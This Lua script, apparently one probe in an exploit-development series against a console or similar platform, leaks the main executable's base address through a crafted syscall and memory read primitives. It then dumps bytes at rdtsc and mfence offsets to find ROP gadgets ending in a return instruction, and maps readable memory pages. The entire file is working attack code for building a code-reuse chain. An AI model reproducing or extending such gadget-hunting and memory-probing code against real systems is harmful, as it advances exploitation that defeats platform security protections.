-- CRASH_CLASS: LOW
-- PROBE 1403j: read exact bytes at interesting rdtsc/mfence offsets
--
-- From 1403h scans: 41 rdtsc hits total, 9 mfence.
-- Check if any rdtsc has a nearby ret (C3).
-- Check the rdtsc+C9 (leave) hits: is C3 right after?
-- Also probe 4KB pages from +0x3A0000 to find safe scan limit.

print("=== 1403j: check gadgets ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local ebn = N(uint64(string.format("0x%X%08X", eb_hi, eb_lo)))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Helper: read 8 bytes at offset, print as hex
local function dump8(label, off)
    local d1 = rd(ebn + off)
    local d2 = rd(ebn + off + 4)
    if not d1 then
        print(string.format("  %s +0x%06X: UNREADABLE", label, off))
        return
    end
    local bytes = {}
    bytes[1] = d1 % 256
    bytes[2] = math.floor(d1 / 256) % 256
    bytes[3] = math.floor(d1 / 65536) % 256
    bytes[4] = math.floor(d1 / 16777216) % 256
    if d2 then
        bytes[5] = d2 % 256
        bytes[6] = math.floor(d2 / 256) % 256
        bytes[7] = math.floor(d2 / 65536) % 256
        bytes[8] = math.floor(d2 / 16777216) % 256
    end
    local hex = ""
    for i = 1, #bytes do hex = hex .. string.format("%02X ", bytes[i]) end
    -- Check for C3 in first 6 bytes after 0F 31
    local has_ret = false
    for i = 3, math.min(#bytes, 8) do
        if bytes[i] == 0xC3 then has_ret = true end
    end
    local tag = has_ret and " *** HAS RET ***" or ""
    print(string.format("  %s +0x%06X: %s%s", label, off, hex, tag))
end

-- ============================================================
-- [A] All rdtsc hits from both scans
-- ============================================================
print("")
print("=== [A] rdtsc context (8 bytes each) ===")

-- From lower scan (0-2.5MB)
local lower = {
    0x017C42, 0x017C98, 0x02AB56, 0x02ABA2,
    0x06A109, 0x06E0D2, 0x06E128, 0x07C352,
    0x07C3AC, 0x085562, 0x0855BC, 0x0CF580,
    0x0F71B1, 0x11CD16, 0x120CB1, 0x13E68E,
    0x14317D, 0x193606, 0x193652, 0x19B416,
    0x19B462, 0x19BBD0, 0x1CAEE0, 0x1CE0BA,
    0x2767B8, 0x2768E3, 0x27693B,
}

-- From upper scan (2.5-3.625MB)
local upper = {
    0x2B69B2, 0x2B6A08, 0x2BDAB2, 0x2BDB0C,
    0x2C12A2, 0x2C12FC, 0x2C6592, 0x2C65B2,
    0x2C6642, 0x2C68B9, 0x2E8B09, 0x2EF645,
    0x2EF775, 0x305333,
}

-- Prioritize C9 (leave) hits and unusual ones
local priority = {
    0x0CF580,   -- C9
    0x0F71B1,   -- C9
    0x13E68E,   -- C9
    0x14317D,   -- C9
    0x2EF645,   -- C9
    0x1CE0BA,   -- DB
    0x2767B8,   -- D2
    0x305333,   -- 00
}

print("priority (C9/DB/D2/00 next byte):")
for _, off in ipairs(priority) do
    dump8("rdtsc", off)
end

print("")
print("all others:")
local pset = {}
for _, off in ipairs(priority) do pset[off] = true end

for _, off in ipairs(lower) do
    if not pset[off] then dump8("rdtsc", off) end
end
for _, off in ipairs(upper) do
    if not pset[off] then dump8("rdtsc", off) end
end

-- ============================================================
-- [B] mfence context
-- ============================================================
print("")
print("=== [B] mfence context ===")
local mfences = {
    0x2CCF69, 0x2CCF9E, 0x2CD06B,
    0x308F39, 0x308F6E, 0x30903B,
    0x30BEE9, 0x30BF1E, 0x30BF6B,
}
for _, off in ipairs(mfences) do
    dump8("mfence", off)
end

-- ============================================================
-- [C] Safe boundary: 4KB pages from +0x3A0000
-- ============================================================
print("")
print("=== [C] boundary (4KB from +0x3A0000) ===")
local last_safe = 0x3A0000
for off = 0x3A0000, 0x3B0000, 0x1000 do
    local v = rd(ebn + off)
    if v then
        last_safe = off
    else
        print(string.format("fail at +0x%06X", off))
        break
    end
end
print(string.format("last_safe=+0x%06X", last_safe))

-- Continue past gap?
if last_safe < 0x494000 then
    print("probing past gap...")
    for off = last_safe + 0x10000, 0x494000, 0x10000 do
        local v = rd(ebn + off)
        if v then
            print(string.format("+0x%06X: READABLE", off))
        end
    end
end

print("")
print("=== 1403j DONE ===")
